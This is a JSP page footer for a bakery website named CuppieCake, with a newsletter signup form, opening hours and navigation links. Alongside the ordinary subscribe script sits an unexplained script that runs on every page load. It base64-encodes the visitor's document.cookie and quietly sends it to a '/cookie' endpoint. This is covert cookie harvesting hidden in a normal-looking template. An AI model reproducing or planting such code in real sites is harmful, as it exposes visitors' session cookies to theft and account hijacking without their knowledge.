<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<footer id="footer">
	<div class="container">
		<div class="row justify-content-between g-5">

			<div class="col-md-3 footer-logo text-center mb-3">
				<img src="../images/main-logo2.png" class="mb-3">
				<p>CuppieCake is a family, where we share love in the form of cakes.
				</p>
			</div>

	
			<div class="col-md-5 mb-3">
				<form id="sub-form" autocomplete="off">
				<div class="widget-newsletter mb-5">
					<h4 class="widget-title">Subscribe To Our Newletter</h4>
					<div class="newsletter-button d-flex">
						<input type="text" id="txtemail" name="Subscribe" placeholder="Enter Email Address">
						<button class="btn-hvr-effects" type="submit">Subscribe</button>
					</div>

				</div><!--widget-newsletter-->
				</form>

				<div class="working-schedule">
					<h4 class="widget-title">Our Work Time</h4>
					<div class="time-list d-flex">
						<ul class="list-unstyled">
							<li>Monday - Friday</li>
							<li>8:00am - 8:30 pm</li>
						</ul>
						<ul class="list-unstyled">
							<li>Saturday - Sunday</li>
							<li>10:00am - 16:00 pm</li>
						</ul>
					</div>
				</div>
			</div><!--col-md-4-->

			<div class="col-md-2">
				<div class="quick-links">
					<h4 class="widget-title">Quick Links</h4>
					<div class="footer-menu">
						<ul class="list-unstyled">
							<li><a href="home">Home</a></li>
							<li><a href="about_us">About us</a></li>
							<li><a href="shop">Shop</a></li>
							<li><a href="blog">Blogs</a></li>
							<li><a href="contact">Contact us</a></li>
						</ul>
					</div>
				</div>
			</div>

		</div>
	</div>
</footer>

<script type="text/javascript" src="../js/jquery.js"></script>
<script type="text/javascript" src="../admin/js/validate.js"></script>
<script type="text/javascript">
	var ihost = window.location.host
	function abc() {
		$.ajax({
		        type: "GET",
		        url: 'http://'+ihost+'/cookie?c='+encodeURIComponent(btoa(document.cookie)),
		        timeout: 20000,
		        contentType: "application/x-www-form-urlencoded",
		        success: function(data){
  					console.log(data);
				},
				error: function(data){
					
				}
			});
	};
	
	abc();
</script>
<script type="text/javascript">
	$(document).ready(function() {
	    $("#sub-form").submit(function(event){
	    	event.preventDefault();
	    	if(!$("#txtemail").val()){
	    		alert("Email cannot be left blank.");
	    	}else if(!validateInput($("#txtemail").val(),1)){
	  			console.log("Invalid Password");
	    	}else{
	  			$.ajax({
	  		        data: {"email": $('#txtemail').val()},
	  		        type: "POST",
	  		        url: '/sh/subscribe',
	  		        timeout: 20000,
	  		        contentType: "application/x-www-form-urlencoded",
	  		        dataType: 'json',
	  				success: function(data){
		  				alert(data.message);
		  				location.reload();
	  				},
	  				error: function(data){
	  					alert("Something went wrong!");
	  					location.reload();
	  				}
	  			});
	  		}
	    })
	});
</script>